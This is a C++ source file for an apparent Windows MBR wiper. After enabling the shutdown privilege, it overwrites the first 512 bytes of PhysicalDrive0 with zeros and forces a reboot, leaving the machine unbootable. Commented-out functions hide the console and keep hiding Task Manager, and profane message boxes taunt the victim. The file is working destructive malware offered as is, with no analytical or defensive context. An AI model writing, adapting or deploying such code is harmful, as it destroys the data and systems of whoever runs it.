
#include <Windows.h>
#include <shlobj_core.h>
#include <thread>
#include <iostream>
using namespace std;


bool checkAdminRole();
void closeCurrentWindow();
void thread_close_windows();
void destroyMBR();
BOOL SetPrivilege(
	HANDLE, LPCTSTR, BOOL);

int main() {
	//closeCurrentWindow();
	if (!(checkAdminRole)) {
		ExitProcess(0);
	}
	//thread_close_windows();
	//thread thread_obj(thread_close_windows);
	HANDLE procToken;
	if (!(OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &procToken))) {
		MessageBoxA(NULL, "INFO", "Failed Token", NULL);
	}
	if (SetPrivilege(procToken, SE_SHUTDOWN_NAME, true)) {
		MessageBoxA(NULL, "INFO", "Success Privi", NULL);
	}
	else {
		MessageBoxA(NULL, "INFO", "Failed Privi", NULL);
	}
	destroyMBR();

	return EXIT_SUCCESS;
}

bool checkAdminRole() {

	return IsUserAnAdmin();
}

void closeCurrentWindow() {
	HWND consoleWindow;
	consoleWindow = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(consoleWindow, 0);
}

void thread_close_windows() {
	while (true) {
		HWND TaskMGR = FindWindow(NULL, "Task Manager");
		ShowWindow(TaskMGR, 0);
		Sleep(250);
	}
}

void destroyMBR() {

	DWORD write;
	const char * debugString = "I double f*cking dare you to debug me";
	char masterBootRecordOverwrite[512];


	for (int i = 0; i < 512; i++) {
		masterBootRecordOverwrite[i] = 0;
	}
	//ZeroMemory(&masterBootRecordOverwrite, (sizeof masterBootRecordOverwrite));

	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (WriteFile(MBR, masterBootRecordOverwrite, 512, &write, NULL))
	{
		MessageBoxA(NULL, debugString, "Overrided Mother Fucker", MB_OK);
		Sleep(5000);
		ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_OPERATINGSYSTEM);
	}
	else
	{
		MessageBoxA(NULL, debugString, "Failed to Overwrite Bitch!", MB_OK);
		Sleep(5000);
		ExitProcess(0);
	}
	CloseHandle(MBR);
}

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		return FALSE;
	}

	return TRUE;
}